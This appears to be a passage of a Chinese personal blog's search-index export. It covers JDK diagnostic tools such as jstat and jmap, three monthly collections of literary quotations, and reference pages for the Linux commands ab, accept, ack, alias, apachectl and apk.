打包工具，可以将文件和目录打包成为 .jar 文件；.jar 文件本质上就是 zip 文件, 只是后缀不同。使用时按顺序对应好选项和参数即可。 |\n| keytool | 安全证书和密钥的管理工具; （支持生成、导入、导出等操作） |\n| jarsigner   | JAR 文件签名和验证工具 |\n| policytool  | 实际上这是一款图形界面工具, 管理本机的 Java 安全策略 |\n| jps/jinfo | 查看 java 进程 |\n| **jstat** | 查看 JVM 内部 gc 相关信息 |\n| **jmap** | 查看 heap 或类占用空间统计 |\n| **jstack** | 查看线程信息 |\n| jcmd | 执行 JVM 相关分析命令（整合命令） |\n| jrunscript/jjs | 执行 js 命令 |\n\n<!-- more -->\n\n### 常用命令实例\n\n```shell\njps -l\njps -mlv \n# -l 列出 Java 进程\n# -m 列出传递给 main 方法的参数\n# -v 列出传递给 JVM 的参数\n\njinfo pid\n\n# 参考：https://blog.csdn.net/maosijunzi/article/details/46049117\n# jstat   内存信息\njstat -gc pid 1000 1000 # 每1000ms打印1次，打印1000次\nS0C    S1C    S0U    S1U      EC       EU        OC         OU       MC     MU    CCSC   CCSU   YGC     YGCT    FGC    FGCT     GCT\n4352.0 4352.0 4352.0  0.0   34944.0  10175.9   198132.0   152461.3  142132.0 134139.5 19624.0 16988.2     26    0.201   0      0.000    0.201\n4352.0 4352.0 4352.0  0.0   34944.0  10175.9   198132.0   152461.3  142132.0 134139.5 19624.0 16988.2     26    0.201   0      0.000    0.201\n4352.0 4352.0 4352.0  0.0   34944.0  10175.9   198132.0   152461.3  142132.0 134139.5 19624.0 16988.2     26    0.201   0      0.000    0.201\n# S0C：第一个幸存区的大小\n# S1C：第二个幸存区的大小\n# S0U：第一个幸存区的使用大小\n# S1U：第二个幸存区的使用大小\n# EC：伊甸园区的大小\n# EU：伊甸园区的使用大小\n# OC：老年代大小\n# OU：老年代使用大小\n# MC：方法区大小\n# MU：方法区使用大小\n# CCSC：压缩类空间大小\n# CCSU：压缩类空间使用大小\n# YGC：年轻代垃圾回收次数\n# YGCT：年轻代垃圾回收消耗时间\n# FGC：老年代垃圾回收次数\n# FGCT：老年代垃圾回收消耗时间\n# GCT：垃圾回收消耗总时间\n\njstat -gcutil pid 1000 1000\n  S0     S1     E      O      M     CCS    YGC     YGCT    FGC    FGCT     GCT\n  0.00  79.37  72.86  78.50  94.45  86.65     27    0.207     0    0.000    0.207\n  0.00  79.37  72.86  78.50  94.45  86.65     27    0.207     0    0.000    0.207\n  0.00  79.37  72.86  78.50  94.45  86.65     27    0.207     0    0.000    0.207\n# S0：幸存1区当前使用比例\n# S1：幸存2区当前使用比例\n# E：伊甸园区使用比例\n# O：老年代使用比例\n# M：元数据区使用比例\n# CCS：压缩使用比例\n# YGC：年轻代垃圾回收次数\n# FGC：老年代垃圾回收次数\n# FGCT：老年代垃圾回收消耗时间\n# GCT：垃圾回收消耗总时间\n\n# 只看 Young 或 Old 区\njstat -gcnew pid\njstat -gcold pid\n\n# jmap    对象信息\njmap -heap pid      # 堆内存\njmap -histo pid     # 直方图\n\n# jstack  线程信息\njstack -l pid       # 将线程相关的 locks 信息一起输 出，比如持有的锁，等待的锁。\n\n# jcmd 综合了前面的几个命令\njcmd pid VM.version\njcmd pid VM.flags\njcmd pid VM.command_line\njcmd pid VM.system_properties\njcmd pid Thread.print\njcmd pid GC.class_histogram\njcmd pid GC.heap_info\n\n# 当curl命令用\njrunscript -e \"cat('http://www.baidu.com')\" \n# 执行js脚本片段\njrunscript -e \"print('hello,kk.jvm'+1)\" \n# 执行js文件 \njrunscript -l js -f /XXX/XXX/test.js\n\n```\n\n## JVM 图形化工具\n\n### jconsole\n\nJDK 自带工具\n\n![jconsole-内存](https://up-img.yonghong.tech/pic/2021/04/03-17-11-jconsole-mem-MJI7ul.png)\n![jconsole-线程](https://up-img.yonghong.tech/pic/2021/04/03-17-12-jconsole-thread-b0RSWW.png)\n![jconsole-概览](https://up-img.yonghong.tech/pic/2021/04/03-17-12-jconsole-guide-KgMCzE.png)\n\n### jvisualvm\n\n![jvisualvm](https://up-img.yonghong.tech/pic/2021/04/03-17-15-jvisualvm-guide-JU8yC7.png)\n\n### VisualGC\n\n![VisualGC](https://up-img.yonghong.tech/pic/2021/04/03-17-16-VisualGC-poZ5Sm.png)\n\n### jmc\n\n需要安装 Oracle JDK。\n\n![jmc](https://up-img.yonghong.tech/pic/2021/04/03-17-16-jmc-yNni2V.png)\n![jmc-1](https://up-img.yonghong.tech/pic/2021/04/03-17-16-jmc-1-5ultLq.png)\n![jmc-2](https://up-img.yonghong.tech/pic/2021/04/03-17-16-jmc-2-gKxxpd.png)\n![jmc-3](https://up-img.yonghong.tech/pic/2021/04/03-17-16-jmc-3-GleUio.png)\n","categories":["Java进阶"],"tags":["Java进阶","JVM"]},{"title":"句读-2020年09月","url":"//judou-2020-09/","content":"\n> 生活如果没有目标，就会变得懒散。一旦决定“今天这样做”，生活一下子就会张弛有度。中村恒子\n\n<!-- more -->\n\n- 我从来不想显得不友好，可是我也从来没有刻意努力显得友好。因为有时我还是想独自一人，不被打扰。石黑一雄 《远山淡影》\n\n- 用疑问句回答疑问句时，一般就是说中了。《四重奏》\n\n- 不了解别人的痛苦，又要去安慰，那总是很困难的事。小仲马 《茶花女》\n\n- 有时候别人对你很糟糕，不代表你就该被糟糕地对待。很多人爱你，关心你，希望你要知道。\n\n- 没有人天生就强、就弱或意志坚定。是后来才变强，后来才意志坚定。命运不在人身上，而在人四周。阿贝尔·加缪\n\n- 能被一个人放在心上，从来都不是理所当然的事，不管那个人是谁，是家人还是朋友，都非常难得，应该要好好珍惜才对。《想见你》\n\n- 年轻人常常觉得自己很叛逆，但是回看历史，年轻人常常是最随波逐流的，因为他们的内在自我还不够强大，所以往往隐身于群体去获得力量，把潮流当作思想。刘瑜\n\n- 凡事都有可能，永远别说永远。《放牛班的春天》\n\n- 那些住进日记里很多页的人，最后还是走丢了，好像我们的交集也只存在于那几页纸上。就是初霁\n\n- 人生苦短，感到欢乐的弹指之间，若不开怀大笑，日后岂不后悔？森鸥外 《泡沫记》\n\n- 我想现代社会的忧郁就是这么回事，人们对幸福生活的定义愈来愈高，以前人的普通生活成了现在的悲惨生活。北野武\n\n- 生活如果没有目标，就会变得懒散。一旦决定“今天这样做”，生活一下子就会张弛有度。中村恒子\n\n- 你无需告诉每个人，那一个个艰难的日子是如何熬过来的，但，总有一天你要向这个世界大声呐喊：我成功的走过了人生中灰暗的时光。德卡先生\n\n- 不要太在乎一些人，越在乎，越卑微。周国平\n\n- 我在和每一段我以为会走得长远的友谊告别。 只希望我再也不会因她们伤心难过了。夏至粥五\n\n- 人的一生，你所经历的一些东西是必定的，或许在你来到这个世界之前，你已经看过自己的剧本了，所以才会选择以这个身份来到这个世界，所以就一定会有你觉得值得的事情。里予\n\n- 明知世界上没有安慰可言，他就自己创造安慰。明知生活没有什么意义，他就自己创造生活的意义。罗曼·罗兰\n\n- 人生太过复杂，我也不是万事明了，能送给你的只有四个字“好好感受”。田村正和\n\n- 太多人活得不像自己。思想是别人的意见，生活是别人的模仿，情感是别人的引述。奧斯卡·王尔德\n\n- 生活自会消化一切，既不要人帮忙，也不要人同意。契诃夫 《游猎惨剧》\n\n- 我的经验是，碰到任何困难都要赶快往前走，不要欣赏那个让你摔倒的那个坑。 ​​​​黄永玉\n\n- 我注意到：一个懒惰的人，一个不愿动的人，一旦动起来，就会持之以恒动下去，就跟他坚持待着不动时一样，好像他不喜欢的倒不是动本身，而是开始和停止。威廉·福克纳 《我弥留之际》\n\n- 你的生活深度取决于你对年幼者的呵护，对年长者的同情，对奋斗者的怜悯体恤，对弱者及强者的包容。因为生命中总有一天你会发现其中每一个角色你都扮演过。乔治·华盛顿\n\n- 所有的人类都是活在主观之中，只要改变自己的看法，世界就会改变。从那一瞬间开始，人就会获得重生。《被讨厌的勇气》\n\n- 我对这个世界生气，它也对我生气，我对这个世界不满，它也对我不满，我发泄了什么出去，它就照样把什么送回来。德卡先生\n\n- 生活只能向后理解。 但它必须向前发展。索伦·克尔凯郭尔\n\n- 性情中人，很容易犯两个错误：一个是因为别人细节上的不合心意或者犯了某个私家忌讳就唾弃之，退避三舍；另一个是因为别人说了一句你一直想听的话，就引为知己，死心塌地。潘向黎 《万念》\n\n- 你有没有过这种情况：在一个陌生的地方，看到一个陌生人，心想「这可能是我这辈子唯一和他相遇的瞬间」。然后就很难过。\n\n","categories":["句读"],"tags":["句读"]},{"title":"句读-2020年10月","url":"//judou-2020-10/","content":"\n> 答非所问，其实已经是答了。木心\n\n---\n\n浮现在天空中的月亮尽管一样，但我们看到的也许是另一个东西。村上春树 《1Q84》\n\n其实秋天不是秋天，秋天是夏天努力地想要停止下来的那段时光。简蔓\n\n<!-- more -->\n\n生活比秩序重要，适度的混乱对心灵有益。玛丽莲·弗伦奇\n\n不要说住在同一个城市，就算天天出没在同一座楼里，原来说见不着就是见不着。缘分一物，竟可诡谲至此。其实，人用不着出海，隔断千山的大海自然会跟着你。梁文道 《我执》\n\n坏名声比好名声容易承担多了，因为后者背负起来更沉重，你必须表现得名副其实，而任何偏差都会被看成像是你犯了罪。坏名声的话，名实不符却可以当作是你在与人为善。阿尔贝·加缪\n\n喜欢，是看某物好甚至极好，随之而来的念头是：“欲占有”。爱，则多是看某物不好或还不够好，其实是盼望它好以至非常好，随之而得的激励是：“愿付出”。史铁生\n\n一个人无须为他的时代着急，也无须为个人着急，他只须天真的没办法，自然会在波浪上浮着，而相信：哼，我浮着最合适。老舍\n\n---\n\n肉体才是人的神殿，不管里面供奉的是什么，都应该好好保持它的强韧、美丽和清洁。村上春树\n\n人变得真正低劣时，除了高兴别人的不幸之外，已无其他乐趣可言。歌德\n\n我想你了，可是我不能对你说，怕只怕，说了，对你也是一种折磨。艾米莉·狄金森\n\n一个人若没有独立的人格，别人一个眼神，便可以把你关进心牢里，别让自己的灵魂，一辈子都在牢笼中渡过。《半山文集》\n\n懒惰是索价极高的奢侈品，一旦到期清付，必定偿还不起。徐悲鸿\n\n很喜欢那种通过一点点的努力，然后感受到自己正在慢慢进步的感觉。就像爬山一样，随着跟山顶的距离逐渐拉近，看到的风景也越来越美，内心更是越发欢愉。其实无论离山顶有多远，人总归应该多看些这种风景的。\n\n你要搞清楚自己人生的剧本——不是你父母的续集，不是你子女的前传，更不是你朋友的外篇。对待生命你不妨大胆冒险一点，因为最终你要失去它。生命中最难的阶段不是没有人懂你，而是你不懂你自己。尼采  \n\n---\n\n对谁都很温柔，就说明谁都不重要，明确到底谁才是最重要的，也是一种温柔吧。《请和废柴的我谈恋爱》\n\n很多时候，优秀的人难以接受自己平庸，因为他们自省意识强，但能力又可能不足以改变现状。毕导\n\n你对人情世故的每一分通透，对爱来爱去的每一分豁达，都是用失望换来的。傅首尔\n\n人生在世，会遇到一些好事，还会遇上些坏事。好事我承受得起，坏事也承受得住。就这样坦荡荡做个寻常人也不坏。王小波\n\n我决定不要再假装自己知道很多事情。我要成为我自己，渴望学习一切有待了解的东西。当你想显示自己是房间里最聪明的人时，就会什么东西都学不到了。芭芭拉·金索沃尔\n\n没有人在修剪其生活之时会不割伤自己。勒内·夏尔\n\n我最快乐的时候，是我既不思想也不向往的时候，甚至没有梦的时候。佩索阿\n\n---\n\n你像风来了又走，我心满了又空。张爱玲 《半生缘》\n\n一点点小事就可以安慰我们，因为一点点小事就可以刺痛我们。帕斯卡尔 《沉思录》\n\n人类不快乐的唯一原因是他不知道如何安静地呆在他的房间里。帕斯卡 《思想录》\n\n一个人如果刻意逃避他所惧怕的东西，也许会发现自己只是抄了条近路去见它。约翰·罗纳德·瑞尔·托尔金\n\n做你自己，说出你的感受，因为那些介意的人对你不重要，而对你重要的人不会介意。苏斯博士\n\n一个人里有两个我，一个在黑暗中醒着，一个在光明中睡着。卡里·纪伯伦 《沙与沫》\n\n真正的英雄不是改变世界，而是改变自己生活的每一天。项飚 《把自己作为方法》\n\n---\n\n答非所问，其实已经是答了。木心\n\n交谈如果超过理解的限度可能就是一种破坏，一种炫耀。艾丽丝·门罗\n\n周一到周五是出卖自己灵魂的日子，周六和周日是赎回自己灵魂的日子。 朱德庸","categories":["句读"],"tags":["句读"]},{"title":"句读-2020年11月","url":"//judou-2020-11/","content":"\n> 能折磨你的，从来不是别人的绝情，而是你的心存幻想和期待。 ​​​​\n\n---\n\n生活如果没有目标，就会变得懒散。一旦决定“今天这样做”，生活一下子就会张弛有度。 ​​​​中村恒子\n\n如果一个人必须完成一件自己不喜欢的事，最好的办法就是尽快做好，然后结束。迟子建\n\n无论风暴将我带到什么样的岸边，我都将以主人的身份上岸。贺拉斯\n\n<!-- more -->\n\n有的人走了就再也没回来过，所以，等待和犹豫才是这个世界上最无情的杀手。三毛\n\n你总是喜欢把事情拖到第二天，你不能再这么拖了，因为有一天，你会有很多事要做，你的余生都不够你用。《余生的第一天》\n\n很多时候，并不是别人在折磨我们，而是我们用自己的价值观去评判对方的是非对错，是我们在折磨自己。铃木大拙\n\n我太想爱上一个人了，只是不知道该爱谁。《木兰花》\n\n---\n\n语言和文字真的是不可执取的东西，当一句话说出来或者写下来，它就不是你的了，你必须允许别人任意解读，甚至误读。所以我最想说的话，其实在我开口的一刹那就已经说完。扎西朗姆·多多\n\n当没有任何一个人信任你的时候，沉默和坚持就是最好的反击和证明。托马斯·哈里斯 《沉默的羔羊》\n\n你形容自己是随和、好相处又安分守己的人，所以你要不就是非常随和，要不就是极度与人疏离。《大小谎言》\n\n我渴望拥抱你，对你说一千句温柔的蠢话，然这样的话只能在纸上我才能好意思写写，即使在想象中我见了你也将羞愧低头，你是如此可爱而残忍。朱生豪 《醒来觉得甚是爱你》\n\n我们必须全力以赴，同时又不抱持任何希望。不管做什么事，都要当它是全世界最重要的一件事，但同时又知道这件事根本无关紧要。里尔克\n\n我们要的或许不是爱，而是偏爱，从他人的偏爱里，确认自己是独特的。只有这样，才能消解在芸芸众生中的孤独。苏更生\n\n世界上最让人感动的，是遥远的相似性。霍金\n\n---\n\n假如您此时此刻刚好陷入了困境，正饱受折磨，那么我很想告诉您：“尽管眼下十分艰难，可日后这段经历说不定就会开花结果。”也不知道这话能否成为慰藉，不过请您这样换位思考、奋力前行。村上春树\n\n我去练习，去训练，就是避免自己过度思考。平野步梦\n\n我不会再尝试成为真实的我以外的东西了，我希望你能接受这样的我。《她》\n\n人的本能是追逐从他身边飞走的东西，却逃避追逐他的东西。伏尔泰\n\n有教养不是吃饭不洒汤，是别人洒汤的时候别去看他。契诃夫\n\n能折磨你的，从来不是别人的绝情，而是你的心存幻想和期待。 ​​​​\n\n生活给了我想要的东西，又让我知道这都是没有意义的。\n\n---\n\n若有人能让你体会到心碎狂喜和一败涂地，那伟大的并不是他而是你自己。琦殿\n\n人的一生中，最光辉的一天并非是功成名就那天，而是从悲叹与绝望中产生对人生的挑战，以勇敢迈向意志那天。福楼拜\n\n有时候，觉得所有人都很美好，下一刻，这些人又变得贪得无厌，而且世界冷酷无比，根本没有自己的立足之地。然而，这都是自己的内心产生的幻想。我们总是将自己内心的恐惧投射在他人身上，当我们看他人，或是看世界的时候，其实看到的是自己。石田衣良 《掌心迷路》\n\n太在意别人的视线和评价，才会不断寻求别人的认可。对认可的追求，才扼杀了自由。由于不想被任何人讨厌，才选择了不自由的生活方式。换言之，自由就是不再寻求认可。阿德勒\n\n在以后的日子里，如果我们在各自的道路上，能不时对望一眼，就好了。林清玄\n\n我始终相信，一切高贵的情感都羞于表白，一切深刻的体验都拙于言辞。周国平\n\n事实是，每个人都有可能伤害你。你只需要找到那些值得让你忍受的人。鲍勃·马利\n\n---\n\n比起偶然的幸福感，充足的睡眠似乎有着更持久的治愈力。禾几\n\n渺小的忧伤和渺小的爱寿命很长，伟大的爱和伟大的忧伤却毁于自身的过于丰富强烈。王尔德 《道林·格雷的画像》\n\n\n","categories":["句读"],"tags":["句读"]},{"title":"【Linux 命令】ab","url":"/linux-command/ab/","content":"\nApache服务器的性能测试工具\n\n## 补充说明\n\n**ab命令** 是一个测试你 Apache http 服务器的工具，你可以通过这个工具，指定一个单位时间内向 apache 发出的请求数量来看看你的 Apache 和机器配合的性能如何。\n\n### 语法\n\n```shell\nab [ -A auth-username:password ] [ -c concurrency ] [ -C cookie-name=value\n] [ -d ] [ -e csv-file ] [ -g gnuplot-file ] [ -h ] [ -H custom-header ] [\n-i  ]  [  -k  ]  [  -n  requests  ] [ -p POST-file ] [ -P proxy-auth-user‐\nname:password ] [ -q ] [ -s ] [ -S ] [ -t timelimit ] [ -T content-type  ]\n[  -v verbosity] [ -V ] [ -w ] [ -x <table>-attributes ] [ -X proxy[:port]\n]  [  -y  <tr>-attributes  ]  [  -z   <td>-attributes   ]   [http://]host‐\nname[:port]/path\n```\n\n### 选项\n\n```shell\n-A auth-username:password\n      #  支持基本的验证证书,用户名和密码之间使用\"冒号\"                    :\n      # 分隔开,ab将以明文方式传送过去.不管服务器是不是需要\n      # ,也就是说你的服务器需要支持401认证.\n\n-c concurrency\n      # 同时向服务器端发送的请求数目，默认状态下是一次 只执行一个http请求.\n\n-C cookie-name=value\n      # Add a Cookie: line to the request. The argument is typically in the\n      # form of a name=value pair. This field is repeatable.\n\n-d    #  Do not display  the  \"percentage  served  within  XX  [ms]  table\".\n      # (legacy support).\n\n-e csv-file\n      # Write  a  Comma  separated value (CSV) file which contains for each\n      # percentage (from 1% to 100%) the time (in milli seconds) it took to\n      # serve  that percentage of the requests. This is usually more useful\n      # than the 'gnuplot' file; as the results are already 'binned'.\n\n-g gnuplot-file\n      # Write all measured values out as a 'gnuplot' or TSV  (Tab  separate\n      # values)  file.  This file can easily be imported into packages like\n      # Gnuplot, IDL, Mathematica, Igor or even Excell. The labels  are  on\n      # the first line of the file.\n-h    # 显示使用说明\n-H custom-header\n      # 向请求包追加附加的标题字串.此参数应该是有效的标题         行(header\n      # line)形式,通常使用冒号\":\"来分隔有效配对 (valid  pair)例如  'Accept-\n      # Encoding: zip/zop;8 bit';\n\n-i    # 使用一个 http 头(HEAD) 来替换 GET方法.不可以掺入POST 方法\n\n-k    #  允许http      KeepAlive      ；也就是说执行多个请求在一个      http\n      # 会话当中，默认是不允许的也就是no KeepAlive啦;)\n\n-n requests\n      # 执行一次测试会话的时候所发出的请求数目,默认是执行一个单一的请求\n      # 当然了这样的测试结果也就没什么意义了\n\n-p POST-file\n      # 测试程序也就是ab,将向Apache server发送带有HTTP POST 的请求.\n\n-P proxy-auth-username:password\n      # 当需要通过代理测试一台 HTTP 服务器的时候而你的代理\n      # 又需要用户名密码验证,这时你可以使用这个选项,同样\n      # 用户名与密码之间使用冒号\":\"分隔开,ab将之以明文的方式\n      # 发送出去,当然,前提是你的代理是处于407认证状态的\n\n-q    #  When processing more than 150 requests, ab outputs a progress count\n      # on  stderr  every  10% or 100 requests or so. The -q flag will sup‐\n      # press these messages.\n\n-s    #  When compiled in (ab -h will show you) use the SSL protected  https\n      # rather  than  the  http  protocol. This feature is experimental and\n      # very rudimentary. You probably do not want to use it.\n\n-S    #  Do not display the median and standard deviation values,  nor  dis‐\n      # play  the  warning/error  messages  when the average and median are\n      # more than one or two times the standard deviation  apart.  And  de‐\n      # fault to the min/avg/max values. (legacy support).\n\n-t timelimit\n      #  设置测试的时间的长短，使用这个选项ab将自动设置\n      # 测试请求会话数目为50000，然后以你设置的时间为\n      # 固定周期.默认状态下是没有时限的，也就是直到完成\n      # 你所设置的请求数目为止.\n\n-T content-type\n      # 内容类型标头,使用在POST数据的时候.\n\n-v verbosity\n      # 设置冗余级别,4级打印出每个请求标头的详细信息,\n      # 3级打印出回应代码(例如,404,200),2级打印出警告 信息和指示消息\n\n-V    # 显示版本号并且退出\n-w    # 打印输出结果到HTML表中. 默认的表是两列n行白底黑框\n\n-x <table>-attributes\n      # 使用字串来描述表的属性,该属性字串应该插入到<table 这里 >\n\n-X proxy[:port]\n      # Use a proxy server for the requests.\n\n-y <tr>-attributes\n      # 用于生成html表格每行的属性名 (<tr>)\n\n-z <td>-attributes\n      # 用于生成html表格每列的属性名 (<td>)\n```\n\n### 参数\n\n主机：被测试主机。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ab"]},{"title":"【Linux 命令】accept","url":"/linux-command/accept/","content":"\n指示打印系统接受发往指定目标打印机的打印任务\n\n## 补充说明\n\n**accept命令** 属于CUPS套件，用于指示打印系统接受发往指定目标打印机的打印任务。\n\n###  语法\n\n```\naccept(选项)(参数)\n```\n\n###  选项\n\n```\n-E：当连接到服务器时强制加密；\n-U：指定连接服务器时使用的用户名；\n-h：指定连接服务器名和端口号。\n```\n\n###  参数\n\n目标：指定目标打印机。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","accept"]},{"title":"【Linux 命令】ack","url":"/linux-command/ack/","content":"\n比grep好用的文本搜索工具\n\n## 安装\n\n```shell\n# ubuntu下要安装ack-grep，因为在debian系中，ack这个名字被其他的软件占用了。\nsudo apt-get install ack-grep\n# alpine Linux-apk软件包管理器 安装 ack\napk install ack\n```\n\n## 参数\n\n这些参数在linux上的适用频率是相当高的，尤其是你用vim做为IDE的话\n\n```shell\n-c(统计)/ -i(忽略大小)/ -h(不显示名称)/\n-l(只显文件名)/ -n(加行号)/ -v(显示不匹配)\n```\n\n## 特点\n\nack官网列出了这工具的5大卖点：\n\n1. 速度非常快,因为它只搜索有意义的东西。\n2. 更友好的搜索，忽略那些不是你源码的东西。\n3. 为源代码搜索而设计，用更少的击键完成任务。\n4. 非常轻便，移植性好。\n5. 免费且开源\n\n## 实例  \n\n在记忆的时候大体上可以分为这几个部分：\n\n> Searching 代码搜索  \n> Search output 搜索结果处理  \n> File presentation 文件展示  \n> File finding 文件查找  \n> File inclusion/exclusion 文件过滤  \n\ngrep常用操作\n\n```shell\ngrep -r 'hello_world' # 简单用法\ngrep '^hello_world' . # 简单正则\nls -l | grep .py # 管道用法\n```\n\n### Searching\n\n简单的文本搜索，默认是递归的。\n\n```\nack-grep hello\nack-grep -i hello\nack-grep -v hello\nack-grep -w hello\nack-grep -Q 'hello*'\n```\n\n### Search File\n\n对搜索结果进行处理，比如只显示一个文件的一个匹配项，或者xxx\n\n```shell\nack-grep --line=1       # 输出所有文件第二行\nack-grep -l 'hello'     # 包含的文件名\nack-grep -L 'print'     # 非包含文件名\n```\n\n### File presentation\n\n输出的结果是以什么方式展示呢，这个部分有几个参数可以练习下\n\n```shell\nack-grep hello --pager='less -R'    # 以less形式展示\nack-grep hello --noheading      # 不在头上显示文件\nack-grep hello --nocolor        # 不对匹配字符着色\n```\n\n### File finding\n没错，它可以查找文件，以省去你要不断的结合find和grep的麻烦，虽然在linux的思想是一个工具做好一件事。\n\n```shell\nack-grep -f hello.py     # 查找全匹配文件\nack-grep -g hello.py$    # 查找正则匹配文件\nack-grep -g hello  --sort-files     # 查找然后排序\n```\n\n### File Inclusion/Exclusion\n\n文件过滤，个人觉得这是一个很不错的功能。如果你曾经在搜索项目源码是不小心命中日志中的某个关键字的话，你会觉得这个有用。\n\n```shell\nack-grep --python hello       # 查找所有python文件\nack-grep -G hello.py$ hello   # 查找匹配正则的文件\n```\n\n## 参考资料\n\n- [ack官网](https://beyondgrep.com/)\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ack"]},{"title":"【Linux 命令】alias","url":"/linux-command/alias/","content":"\n定义或显示别名。\n\n## 概要\n\n```shell\nalias [-p] [name[=value] ...]\n```\n\n## 主要用途\n\n- 简化较长的命令。\n- 定义一个或多个别名。\n- 修改一个或多个已定义别名的值。\n- 显示一个或多个已定义别名。\n- 显示全部已定义的别名。\n\n## 选项\n\n```shell\n-p：显示全部已定义的别名。\n```\n\n## 参数\n\nname（可选）：指定要（定义、修改、显示）的别名。\n\nvalue（可选）：别名的值。\n\n### 返回值\n\nalias返回true除非您要显示的别名未定义。\n\n## 例子\n\n```shell\n# 显示全部已定义的别名\nalias\nalias -p\n\n# 显示已定义的别名（假设当前环境存在以下别名）\nalias ls\nalias ls grep\n\n# 定义或修改别名的值\nalias ls='ls --color=auto'\nalias ls='ls --color=never' grep='grep --color=never'\n```\n\n## 知识点\n\n直接在shell里设定的命令别名，在终端关闭或者系统重新启动后都会失效，如何才能永久有效呢？\n\n使用编辑器打开`~/.bashrc`，在文件中加入别名设置，如：alias rm='rm -i'，保存后执行`source ~/.bashrc`，这样就可以永久保存命令的别名了。\n\n因为修改的是当前用户目录下的`~/.bashrc`文件，所以这样的方式只对当前用户有用。如果要对所有用户都有效，修改`/etc/bashrc`文件就可以了。\n\n> 请注意，以下内容可能与您实际使用的系统有出入:\n>\n> 在CentOS7下，这个文件是`/etc/bash.bashrc`。此外在CentOS7下，细看`~/.bashrc`文件，会发现有这样一段代码：\n>\n> ```shell\n> if [ -f ~/.bash_aliases ]; then\n>   . ~/.bash_aliases\n> fi\n> ```\n>\n> 这个代码的意思就是如果存在那么就加载`.bash_aliases`文件，所以也可以在用户根目录下新建该文件用于单独存放命令别名设置。\n\n\n## 错误用法\n\n- 要显示的别名未定义。\n\n- 当您定义（修改）别名的值的时候，由于值的字符串有空格但您没有用**单引号扩起**，那么会导致严重的问题：\n\n```shell\n# 为方便演示，删除全部别名\nunalias -a\n# 没有用单引号扩起\nalias rm=rm -rf\n# 执行命令后报错 bash: alias: -rf: not found\n# 这时使用alias查看rm的别名时返回 alias rm='rm'\n```\n\n```shell\n# 更具有迷惑性的例子\n# 为方便演示，删除全部别名\nunalias -a\n# 仍然没有用单引号括起\nalias ls=ls --color=never\n# 执行命令后看起来没有报错\n\n# 使用alias查看全部别名会发现运行结果如下：\n# alias --color=never\n# alias ls='ls'\n# alias处理时将它们看成了两组\n```\n\n## Q&A\n\nQ：如果我要显示一到多个别名，但不知道其中是否有未定义的该怎么办？\n\nA：正常执行就是了，alias不会因为有一个未定义的别名就结束对剩余参数的执行。\n\nQ：如果我这么定义`alias cd='ls' ls='cd'`，会有什么后果？\n\nA：运行cd依然会切换目录，运行ls依然会列出文件夹的内容；不要这样定义。\n\n\n### 注意\n\n1. **执行脚本时请注意：**\n\n> 使用`source`命令执行的bash脚本如果执行了`alias`或`unalias`命令，那么有可能会对终端环境的别名设置产生影响；终端环境的别名设置也可能改变运行结果；\n>\n> 通过`sh`方式调用的bash脚本或直接运行当前用户有执行权限的脚本不受终端环境的别名影响。\n\n2. 删除别名，请查看`unalias`命令。\n\n2. 建议您不要对`mv cp rm`等命令的别名设置危险的`-f`选项，比如`alias rm='rm -f'`。\n\n3. 需要注意别名是否和其他命令有冲突的情况。\n\n4. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n### 其他参考链接\n\n[Linux命令详解：\\[8\\]alias创建自己的命令](https://jingyan.baidu.com/article/ac6a9a5e6738422b653eac01.html)\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","alias"]},{"title":"【Linux 命令】apachectl","url":"/linux-command/apachectl/","content":"\nApache服务器前端控制工具\n\n## 补充说明\n\n**apachectl命令** 是Apache的Web服务器前端控制工具，用以启动、关闭和重新启动Web服务器进程。\n\n###  语法\n\n```\napachectl(参数)\n```\n\n###  参数\n\n* configtest：检查设置文件中的语法是否正确；\n* fullstatus：显示服务器完整的状态信息；\n* graceful：重新启动Apache服务器，但不会中断原有的连接；\n* help：显示帮助信息；\n* restart：重新启动Apache服务器；\n* start：启动Apache服务器；\n* status：显示服务器摘要的状态信息；\n* stop：停止Apache服务器。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","apachectl"]},{"title":"【Linux 命令】apk","url":"/linux-command/apk/","content":"\nAlpine Linux 下的包管理工具\n\n## 使用实例\n\n```shell\napk install xxx\napk search xxx # 支持正则\napk info xxx # 查看包的详细信息\napk show # list local package\n# 卸载并删除 包\napk del openssh openntp vim\n```\n\n### 升级\n\nupgrade命令升级系统已安装的所以软件包（一般包括内核），当然也可指定仅升级部分软件包（通过-u或–upgrade选择指定）。\n\n```shell\napk update # 更新最新本地镜像源\napk upgrade # 升级软件\napk add --upgrade busybox # 指定升级部分软件包\n```\n\n### 搜索\n\n```shell\napk search # 查找所以可用软件包\napk search -v # 查找所以可用软件包及其描述内容\napk search -v 'acf*' # 通过软件包名称查找软件包\napk search -v -d 'docker' # 通过描述文件查找特定的软件包\n```\n\n### 查看包信息\n\ninfo命令用于显示软件包的信息。\n\n```shell\napk info # 列出所有已安装的软件包\napk info -a zlib # 显示完整的软件包信息\napk info --who-owns /sbin/lbu # 显示指定文件属于的包\n```\n\n## 笔记\n\n还是蛮喜欢 alpine 的，简单纯粹\n\n```shell\napk add iproute2 # ss vs netstat\nss -ptl\napk add drill # drill vs nslookup&dig\n\ncrond # 开启 cron 服务\ncrontab -l -e\n\napk add xxx\napk search -v xxx\napk info -a xxx\napk info\necho -e \"http://mirrors.aliyun.com/alpine/v3.6/main\\nhttp://mirrors.aliyun.com/alpine/v3.6/community\" > /etc/apk/repositories\napk update\n\n# storage\nibu # alpine local backup\n\n# network\necho \"shortname\" > /etc/hostname\nhostname -F /etc/hostname\n/etc/hosts\n/etc/resolv.conf # conig DNS\nmodprobe ipv6 # enable ipv6\necho \"ipv6\" >> /etc/modules\niface # config interface\napk add iptables ip6tables iptables-doc\n/etc/init.d/networking restart # activate change\napke add iputils # IPv6 traceroute\ntraceroute6 ipv6.google.com\nawall # alpine wall\n# setup a openvpn server\n\n# post-install\n/etc/apk/repositories\napk add cherokee --update-cache --repository http://dl-3.alpinelinux.org/alpine/edge/testing/ --allow-untrusted\napk search -v --description 'NTP' # show description and search from description\napk info -a zlib\napk info -vv|sort\napk info -r -R # require / depency\napk version -v -l '<' # show available updates\napk upgrade -U -a\napk add -u xxx # update xxx\n\n/etc/runlevels # runlevel\napk add openrc # use openrc for init 